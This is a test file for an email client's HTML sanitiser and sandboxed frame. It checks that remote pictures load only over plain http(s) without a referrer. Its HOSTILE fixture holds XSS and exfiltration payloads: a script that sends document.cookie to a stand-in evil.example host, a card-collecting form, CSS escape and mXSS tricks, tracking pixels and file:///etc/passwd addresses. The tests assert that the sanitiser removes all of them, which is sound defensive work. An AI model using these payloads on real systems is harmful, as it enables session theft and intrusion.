// @vitest-environment jsdom
// SPDX-License-Identifier: AGPL-3.0-only
// Remote pictures in a mail, when the reader asks for them. With the switch off nothing changes:
// the sanitiser's output and the frame's policy are what they always were. With it on, remote
// `<img>` and background pictures with plain http(s) addresses load, with no referrer, and nothing
// else does: no script, form, srcset, remote font or style sheet, no address that is not http(s), no
// tracking pixel, no CSS fetch outside the strict background rule, nothing pinned over the message.
import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';

import {
  BLOCKED_CLASS,
  CID_ATTRIBUTE,
  MAX_PICTURE_ADDRESS,
  cleanStyleAttribute,
  prepareMailHtml,
  remotePictureAddress,
} from '../../../src/fantay/artifact/viewers/email/sanitize-mail';
import { MailFrame } from '../../../src/fantay/artifact/viewers/email/MailFrame';
import {
  SANDBOX_FRAME_CSP,
  SANDBOX_FRAME_REMOTE_PICTURES_CSP,
  SandboxFrame,
  sandboxFrameDocument,
} from '../../../src/fantay/artifact/viewers/parts/SandboxFrame';

function markup(html: string, remotePictures: boolean, parts: string[] = []) {
  const prepared = prepareMailHtml(html, (cid) => parts.includes(cid), { remotePictures });
  const host = document.createElement('div');
  host.append(prepared.fragment.cloneNode(true));
  return { ...prepared, html: host.innerHTML, host };
}

/** Every address the output could fetch: picture sources and every `url()` in its styles. */
function addresses(out: ReturnType<typeof markup>): string[] {
  const found: string[] = [];
  for (const element of Array.from(out.host.querySelectorAll('[src]'))) found.push(element.getAttribute('src') ?? '');
  const styles = [out.css, out.bodyStyle, ...Array.from(out.host.querySelectorAll('[style]')).map((element) => element.getAttribute('style') ?? '')];
  for (const text of styles) for (const match of text.matchAll(/url\(([^)]*)\)/gi)) found.push(match[1] ?? '');
  return found;
}

function srcdocOf(html: string): string {
  const raw = /srcDoc="([^"]*)"/i.exec(html)?.[1] ?? '';
  return raw.replace(/&quot;/g, '"').replace(/&#x27;/g, "'").replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&');
}

const NEWSLETTER = `<html><head><style>
.hero { background: #0e2a47 url('https://img.news.example/hero.jpg') no-repeat center / cover; min-height: 50vh; }
.band { background-image: url("https://img.news.example/band.png"); color: white; }
.icon { list-style-image: url(https://img.news.example/dot.png); }
</style></head>
<body background="https://img.news.example/paper.png" bgcolor="#f4f1ea">
<table width="600" background="//img.news.example/table.png"><tr><td class="hero" background="https://img.news.example/td.png">本周精选</td></tr></table>
<p><img src="https://img.news.example/cover.jpg" width="560" height="280" alt="封面" style="display:block" crossorigin="use-credentials" decoding="sync"></p>
<p><img src="//cdn.news.example/logo.png" alt="logo"></p>
<p><img src="https://t.news.example/open.gif" width="1" height="1" alt=""><img src="https://t.news.example/o2.gif" style="display:none"></p>
<p><img srcset="https://img.news.example/a.png 2x" src="https://img.news.example/a.png" alt="a"></p>
<div style="background:url(https://img.news.example/inline.png);position:fixed;top:0">inline</div>
</body></html>`;

describe('remote pictures off: nothing changes', () => {
  it('gives the same output as before, with or without the option', () => {
    const before = prepareMailHtml(NEWSLETTER, () => false);
    const off = prepareMailHtml(NEWSLETTER, () => false, { remotePictures: false });
    const html = (fragment: DocumentFragment): string => {
      const host = document.createElement('div');
      host.append(fragment.cloneNode(true));
      return host.innerHTML;
    };
    expect(html(off.fragment)).toBe(html(before.fragment));
    expect(off.css).toBe(before.css);
    expect(off.bodyStyle).toBe(before.bodyStyle);
    expect(off.blocked).toEqual(before.blocked);
    expect(addresses(markup(NEWSLETTER, false))).toEqual([]);
    expect(markup(NEWSLETTER, false).host.querySelectorAll('img')).toHaveLength(0);
  });

  it('says how many pictures could be shown', () => {
    const off = markup(NEWSLETTER, false);
    const on = markup(NEWSLETTER, true);
    // <img>: cover, logo, a. background attributes: body, table, td. url(): .hero, .band, inline.
    expect(off.pictures).toBe(9);
    expect(on.pictures).toBe(off.pictures);
    // The rest stays blocked either way: the list-style picture.
    expect(on.blocked.images).toBe(1);
    expect(off.blocked.images).toBe(on.blocked.images + on.pictures);
    expect(on.blocked.trackers).toBe(2);
    expect(off.blocked.trackers).toBe(2);
  });
});

describe('remote pictures on: what loads', () => {
  const out = markup(NEWSLETTER, true);

  it('loads remote <img> over http(s), with no referrer, no crossorigin and no srcset', () => {
    const images = Array.from(out.host.querySelectorAll('img'));
    expect(images.map((image) => image.getAttribute('src'))).toEqual([
      'https://img.news.example/cover.jpg',
      'https://cdn.news.example/logo.png',
      'https://img.news.example/a.png',
    ]);
    for (const image of images) {
      expect(image.getAttribute('referrerpolicy')).toBe('no-referrer');
      expect(image.getAttribute('decoding')).toBe('async');
      expect(image.hasAttribute('crossorigin')).toBe(false);
      expect(image.hasAttribute('srcset')).toBe(false);
    }
    expect(images[0]?.getAttribute('width')).toBe('560');
    expect(images[0]?.getAttribute('alt')).toBe('封面');
    expect(out.host.querySelector(`.${BLOCKED_CLASS}`)).toBeNull();
  });

  it('never loads a tracking pixel', () => {
    expect(out.html).not.toContain('t.news.example');
    expect(out.blocked.trackers).toBe(2);
  });

  it('keeps background pictures, and turns background attributes into them', () => {
    expect(out.css).toContain('background: #0e2a47 url(https://img.news.example/hero.jpg) no-repeat center / cover');
    expect(out.css).toContain('background-image: url(https://img.news.example/band.png)');
    expect(out.css).not.toContain('dot.png');
    expect(out.css).toContain('min-height: 400px');
    expect(out.host.querySelector('table')?.getAttribute('style')).toBe('background-image:url(https://img.news.example/table.png)');
    expect(out.host.querySelector('td')?.getAttribute('style')).toBe('background-image:url(https://img.news.example/td.png)');
    expect(out.host.querySelector('[background]')).toBeNull();
    expect(out.bodyStyle).toBe('background-color:#f4f1ea;background-image:url(https://img.news.example/paper.png)');
  });

  it('still lets nothing pin itself over the message', () => {
    expect(out.host.querySelector('div')?.getAttribute('style')).toBe('background:url(https://img.news.example/inline.png);top:0');
  });

  it("puts a background attribute beneath the element's own style", () => {
    const own = markup('<table><tr><td background="https://i.example/a.png" style="background:#fff">x</td></tr></table>', true);
    expect(own.host.querySelector('td')?.getAttribute('style')).toBe('background-image:url(https://i.example/a.png);background:#fff');
  });

  it('keeps an address of up to 2000 characters, and boxes a longer one', () => {
    const base = 'https://i.example/';
    const longest = base + 'a'.repeat(MAX_PICTURE_ADDRESS - base.length);
    const kept = markup(`<img src="${longest}" alt="long">`, true);
    expect(kept.host.querySelector('img')?.getAttribute('src')).toBe(longest);
    const over = markup(`<img src="${longest}a" alt="too long"><div background="${longest}a">x</div><p style="background:url(${longest}a)">y</p>`, true);
    expect(over.host.querySelector('img')).toBeNull();
    expect(over.host.querySelector(`.${BLOCKED_CLASS}`)?.textContent).toBe('too long');
    expect(addresses(over)).toEqual([]);
    expect(over.blocked.images).toBe(3);
    expect(over.pictures).toBe(0);
  });

  it('keeps cid: pictures as before', () => {
    const cid = markup('<img src="cid:logo@news" alt="logo"><img src="cid:gone@x" alt="缺少的图">', true, ['logo@news']);
    expect(cid.host.querySelector('img')?.getAttribute(CID_ATTRIBUTE)).toBe('logo@news');
    expect(cid.host.querySelector('img')?.hasAttribute('src')).toBe(false);
    expect(cid.host.querySelector(`.${BLOCKED_CLASS}`)?.textContent).toBe('缺少的图');
    expect(cid.pictures).toBe(0);
  });
});

describe('remotePictureAddress', () => {
  it('accepts http and https, and makes //host https', () => {
    expect(remotePictureAddress('https://i.example/a.png')).toBe('https://i.example/a.png');
    expect(remotePictureAddress(' HTTP://I.Example/a.png ')).toBe('http://i.example/a.png');
    expect(remotePictureAddress('//i.example/a.png?x=1#y')).toBe('https://i.example/a.png?x=1#y');
    expect(remotePictureAddress('https://i.example/a@2x.png')).toBe('https://i.example/a@2x.png');
  });

  it('refuses everything else', () => {
    for (const address of [
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'data:image/png;base64,iVBORw0KGgo=',
      'file:///etc/passwd',
      'blob:https://i.example/1234',
      'cid:a@b',
      'ftp://i.example/a.png',
      'https:/i.example/a.png',
      'https://',
      '//',
      'https://user:pass@i.example/a.png',
      'https://user@i.example/a.png',
      'https://i.example/a b.png',
      'https://i.example/a\tb.png',
      'https://i.example/a\u0000.png',
      'https://i.example/a\\b.png',
      `https://i.example/${'a'.repeat(MAX_PICTURE_ADDRESS)}`,
    ]) {
      expect(remotePictureAddress(address), address).toBeNull();
    }
  });

  it('in CSS also refuses what could end the token, the declaration or the rule', () => {
    for (const address of ['https://i.example/a".png', "https://i.example/a'.png", 'https://i.example/a(1).png', 'https://i.example/a;b', 'https://i.example/{a}', 'https://i.example/a/*b']) {
      expect(remotePictureAddress(address, true), address).toBeNull();
    }
    expect(remotePictureAddress('https://i.example/a(1).png')).toBe('https://i.example/a(1).png');
  });
});

const HOSTILE = `<html><head>
<meta http-equiv="refresh" content="0;url=https://evil.example/land">
<base href="https://evil.example/">
<link rel="stylesheet" href="https://evil.example/steal.css">
<style>
@import 'https://evil.example/a.css';
@import url(https://evil.example/b.css);
@font-face { font-family: X; src: url(https://evil.example/x.woff2); }
.a { background: url(javascript:alert(1)); }
.b { background-image: image-set(url(https://evil.example/set.png) 1x); }
.c { background: cross-fade(url(https://evil.example/a.png), url(https://evil.example/b.png), 50%); }
.d { background: element(#x); }
.e { background: paint(worklet); }
.f { background-image: src(https://evil.example/src.png); }
.g { width: expression(alert(1)); }
.h { background: url(data:image/svg+xml;base64,PHN2Zz4=); }
.i { background: url(file:///etc/passwd); }
.j { background: url(blob:https://evil.example/1); }
.k { background: url("https://evil.example/q\\"uote.png"); }
.l { background: url(https://evil.example/ok.png), url(javascript:alert(2)); }
.m { list-style-image: url(https://evil.example/list.png); border-image: url(https://evil.example/border.png) 30; cursor: url(https://evil.example/cur.png), auto; content: url(https://evil.example/c.png); mask-image: url(https://evil.example/m.png); }
.n { background: u\\72l(java\\73 cript:alert(3)); }
.o { background: url(https://user:pass@evil.example/cred.png); }
.p { background: url(https://evil.example/a\\9 b.png); }
.q { back/**/ground: url(https://evil.example/split.png); }
.r { behavior: url(https://evil.example/x.htc); -moz-binding: url(https://evil.example/x.xml#x); }
.s { position: fixed; background: url(https://img.example/fine.png); }
.t { background: -webkit-image-set(url(https://evil.example/wk.png) 1x); }
.u { background: url(//img.example/relative.png); }
</style>
<script>fetch('https://evil.example/?c=' + document.cookie)</script>
</head>
<body onload="alert('body')" background="javascript:alert(4)">
<p><img src="https://img.example/real.png" onerror="alert('img')" onload="alert('load')" alt="real"></p>
<p><img src="javascript:alert(5)" alt="js"><img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" alt="html"><img src="file:///etc/passwd" alt="file"><img src="blob:https://evil.example/2" alt="blob"><img src="ftp://evil.example/a.png" alt="ftp"></p>
<p><img src="https://evil.example/track.gif" width="1" height="1"><img src="https://evil.example/t2.gif" style="visibility:hidden"><img src="https://evil.example/t3.gif" style="width:0;height:0"><img src="https://evil.example/t4.gif" style="opacity:0"></p>
<img srcset="https://evil.example/a.png 2x, https://evil.example/b.png 3x" alt="srcset only">
<form action="https://evil.example/collect"><input name="card"><button formaction="https://evil.example/x">提交</button></form>
<iframe src="https://evil.example/frame"></iframe><object data="https://evil.example/x.swf"></object><embed src="https://evil.example/x.swf">
<video src="https://evil.example/v.mp4" poster="https://evil.example/p.png"></video><audio src="https://evil.example/a.mp3"></audio>
<svg><image href="https://evil.example/s.png"/><script>alert('svg')</script><td background="https://evil.example/in-svg.png"></td></svg>
<math><mtext><table><mglyph><style><img src=x onerror=alert('mxss')></style></mglyph></table></mtext></math>
<picture><source srcset="https://evil.example/pic.webp"><img src="https://img.example/pic.png" alt="pic"></picture>
<p style="background:url(https://img.example/inline.png);position:fixed;behavior:url(x.htc)">fixed</p>
<p style="background-image:url('https://img.example/quoted.png')">quoted</p>
<a href="javascript:alert(6)" style="background:url(https://img.example/a.png)">a</a>
<table background="https://user:pass@evil.example/cred.png"><tr><td background="data:image/png;base64,iVBORw0KGgo=">x</td></tr></table>
</body></html>`;

describe('remote pictures on: what still must not survive', () => {
  const out = markup(HOSTILE, true);
  const all = [out.html, out.css, out.bodyStyle].join('\n');

  it('removes every script, handler and script address', () => {
    expect(out.host.querySelector('script, svg, math, iframe, frame, object, embed, video, audio, source, link, meta, base')).toBeNull();
    expect(all).not.toMatch(/<script|alert\(|onerror|onload|javascript:|vbscript:|expression|behavior|binding/i);
  });

  it('removes forms, srcset and every remote font and style sheet', () => {
    expect(out.host.querySelector('form, input, button, textarea, select, [srcset], [poster], [formaction], [action]')).toBeNull();
    expect(all).not.toMatch(/@import|@font-face|\.woff2|\.css\b|srcset/i);
    expect(out.blocked.styles).toBe(3);
    expect(out.blocked.fonts).toBe(1);
  });

  it('loads only http(s) addresses, and none from the hostile host', () => {
    const found = addresses(out);
    expect(found.length).toBeGreaterThan(0);
    for (const address of found) expect(address).toMatch(/^https?:\/\/img\.example\/[^\s"'()\\]+$/);
    expect(all).not.toContain('evil.example');
    expect(all).not.toMatch(/\b(?:data|file|blob|ftp):/i);
  });

  it('lets CSS fetch only through a plain background url()', () => {
    expect(out.css).toContain('.s {background: url(https://img.example/fine.png); }');
    expect(out.css).toContain('.u {background: url(https://img.example/relative.png); }');
    for (const rule of ['.a', '.b', '.c', '.d', '.e', '.f', '.g', '.i', '.j', '.k', '.l', '.m', '.n', '.o', '.p', '.q', '.r', '.t']) {
      expect(out.css).toContain(`${rule} { }`);
    }
    // A `;` inside the data: address ends the declaration there (as with pictures off): what is left
    // after it is not a declaration, and fetches nothing.
    const dataRule = /\.h \{[^}]*\}/.exec(out.css)?.[0] ?? '';
    expect(dataRule).not.toMatch(/url\(|data:/i);
  });

  it('never loads a tracking pixel', () => {
    expect(out.blocked.trackers).toBe(4);
    expect(out.html).not.toMatch(/track\.gif|t[234]\.gif/);
  });

  it('keeps remote <img> without its handlers, and drops pictures that are not http(s)', () => {
    const sources = Array.from(out.host.querySelectorAll('img')).map((image) => image.getAttribute('src'));
    expect(sources).toEqual(['https://img.example/real.png', 'https://img.example/pic.png']);
    expect(out.host.querySelector('img[alt="js"], img[alt="html"], img[alt="file"], img[alt="blob"], img[alt="ftp"]')).toBeNull();
    expect(out.host.querySelector('img[alt="srcset only"]')).toBeNull();
  });

  it('keeps position: fixed out, and keeps the plain background beside it', () => {
    const fixed = Array.from(out.host.querySelectorAll('p')).find((p) => p.textContent === 'fixed');
    expect(fixed?.getAttribute('style')).toBe('background:url(https://img.example/inline.png)');
    expect(Array.from(out.host.querySelectorAll('p')).find((p) => p.textContent === 'quoted')?.getAttribute('style')).toBe(
      'background-image:url(https://img.example/quoted.png)',
    );
    expect(out.host.querySelector('a')?.hasAttribute('href')).toBe(false);
  });

  it('lets no comment or escape hide an address', () => {
    // Decoded first: `u\\72l(java\\73 cript:…)` is a script address and goes; a comment inside the
    // property name leaves no background property to keep.
    expect(cleanStyleAttribute('background:u\\72l(https://img.example/e.png)', undefined, { load: true, count: 0 })).toBe(
      'background:url(https://img.example/e.png)',
    );
    expect(cleanStyleAttribute('background:u\\72l(java\\73 cript:alert(1))', undefined, { load: true, count: 0 })).toBe('');
    expect(cleanStyleAttribute('back/**/ground:url(https://img.example/a.png)', undefined, { load: true, count: 0 })).toBe('');
    expect(cleanStyleAttribute('background:url(https://img.example/a.png/**/)', undefined, { load: true, count: 0 })).toBe(
      'background:url(https://img.example/a.png)',
    );
    expect(cleanStyleAttribute('background:url(https://img.example/a.png)/*x*/,url(javascript:x)', undefined, { load: true, count: 0 })).toBe('');
    expect(cleanStyleAttribute('background:xurl(https://img.example/a.png)', undefined, { load: true, count: 0 })).toBe('');
  });

  it('counts what was shown and what stayed blocked', () => {
    const off = markup(HOSTILE, false);
    expect(out.pictures).toBe(off.pictures);
    expect(off.blocked.images).toBe(out.blocked.images + out.pictures);
    expect(out.blocked).toMatchObject({ scripts: 2, forms: 1, styles: 3, fonts: 1, trackers: 4 });
  });
});

describe('the frame policy', () => {
  it('is byte for byte what it was, unless remote pictures are asked for', () => {
    expect(SANDBOX_FRAME_CSP).toBe(
      "default-src 'none'; img-src data: blob:; font-src data: blob:; style-src 'unsafe-inline'; base-uri 'none'; form-action 'none'",
    );
    expect(sandboxFrameDocument('p{}', { remotePictures: false })).toBe(sandboxFrameDocument('p{}'));
    expect(sandboxFrameDocument('p{}')).toContain(`content="${SANDBOX_FRAME_CSP}"`);
    expect(sandboxFrameDocument('p{}')).not.toContain('name="referrer"');
  });

  it('with remote pictures, opens only img-src to http(s), and sends no referrer', () => {
    expect(SANDBOX_FRAME_REMOTE_PICTURES_CSP).toBe(SANDBOX_FRAME_CSP.replace('img-src data: blob:', 'img-src data: blob: https: http:'));
    expect(SANDBOX_FRAME_REMOTE_PICTURES_CSP).not.toMatch(/script-src|connect-src|frame-src|font-src[^;]*https?:|style-src[^;]*https?:|\*/);
    const doc = sandboxFrameDocument('p{}', { remotePictures: true });
    expect(doc).toContain(`content="${SANDBOX_FRAME_REMOTE_PICTURES_CSP}"`);
    expect(doc).toContain('<meta name="referrer" content="no-referrer">');
    expect(doc).toContain('<base target="_blank">');
  });

  it('puts the chosen policy in the frame, and never lets it run script', () => {
    const off = renderToStaticMarkup(<SandboxFrame title="m.eml" css="" onReady={() => undefined} />);
    const on = renderToStaticMarkup(<SandboxFrame title="m.eml" css="" remotePictures onReady={() => undefined} />);
    expect(srcdocOf(off)).toBe(sandboxFrameDocument(''));
    expect(srcdocOf(on)).toBe(sandboxFrameDocument('', { remotePictures: true }));
    for (const html of [off, on]) {
      expect(/sandbox="([^"]*)"/.exec(html)?.[1]).toBe('allow-same-origin');
      expect(html).not.toContain('allow-scripts');
    }
  });

  it('is the policy of the mail frame only when its pictures are shown', () => {
    const props = { title: 'm.eml', attachments: [], onLink: () => true, onHover: () => undefined, onFitted: () => undefined };
    const off = renderToStaticMarkup(<MailFrame {...props} prepared={markup('<p>x</p>', false)} />);
    const on = renderToStaticMarkup(<MailFrame {...props} prepared={markup('<p>x</p>', true)} remotePictures />);
    expect(srcdocOf(off)).toContain(`content="${SANDBOX_FRAME_CSP}"`);
    expect(srcdocOf(on)).toContain(`content="${SANDBOX_FRAME_REMOTE_PICTURES_CSP}"`);
    expect(/sandbox="([^"]*)"/.exec(on)?.[1]).toBe('allow-same-origin');
  });
});
